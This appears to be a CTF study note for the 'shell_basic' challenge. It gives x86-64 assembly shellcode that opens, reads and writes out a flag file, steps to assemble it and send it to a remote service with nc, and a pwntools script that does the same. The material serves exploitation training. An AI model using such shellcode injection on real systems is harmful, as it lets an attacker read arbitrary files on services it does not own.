; File name: S4_05_shellcode.asm

section .text
global _start
_start:
push 0x0                    ; NULL
mov rax, 0x676e6f6f6f6f6f6f ; oooooong
push rax
mov rax, 0x6c5f73695f656d61 ; ame_is_l
push rax
mov rax, 0x6e5f67616c662f63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax
mov rdi, rsp    ; rdi = '/home/shell_basic/flag_name_is_loooooong'
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30  buf
mov rdx, 0x30     ; rdx = 0x30      len
mov rax, 0x0      ; rax = 0         syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 0x1      ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)

xor rdi, rdi      ; rdi = 0
mov rax, 0x3c     ; rax = sys_exit
syscall           ; exit(0)
```

1. nasm -f elf64 S4_06_shell_basic.asm
    - elf: 32-bit
    - elf-64: 64-bit
2. objdump -d S4_06_shell_basic.o
3. objcopy --dump-section .text=S4_06_shell_basic.bin S4_06_shell_basic.o
4. xxd S4_06_shell_basic.bin
5. cat S4_06_shell_basic.bin | nc <host> <port>
    - host가 client에 의해 실행된 명령(cat S4_06_shell_basic.bin)에 대한 응답을 전송

```python
#!/usr/bin/python3
#Name: S4_06_shell_basic.py

from pwn import *

r = remote('<host>', <port>) # 'example.com', 7777
context.arch = 'amd64' # 64-bit
p = '/home/shell_basic/flag_name_is_loooooong'

shellcode = ''
shellcode += shellcraft.open(p)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

r.recvuntil("shellcode: ")
r.sendline(asm(shellcode))

r.interactive()
```

- pwntools 사용시
    - [참고](./SHF03_STAGE_3_Tool_Installation.md#tool-pwntools)
